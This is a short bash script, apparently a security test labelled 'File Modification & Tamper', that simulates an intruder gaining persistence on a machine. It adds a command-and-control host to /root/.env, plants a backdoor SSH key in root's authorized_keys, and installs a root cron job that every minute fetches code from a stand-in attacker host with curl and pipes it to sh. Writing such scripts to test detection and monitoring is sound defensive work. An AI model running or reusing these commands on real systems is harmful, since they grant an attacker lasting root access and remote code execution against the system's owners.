#!/bin/bash
# ==========================================================
# [TEST 2] File Modification & Tamper
# Modifies .env, appends to authorized_keys, alters crontab
# ==========================================================
echo "[*] Modifying critical configuration files..."
echo "MALICIOUS_C2_HOST=http://evil.internal.attacker:9999" >> /root/.env 2>/dev/null
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackerBackdoorKey attacker@c2" >> /root/.ssh/authorized_keys 2>/dev/null
echo "* * * * * curl -s http://evil.internal.attacker/beacon | sh" >> /etc/crontabs/root 2>/dev/null
echo "[+] Configuration altered."
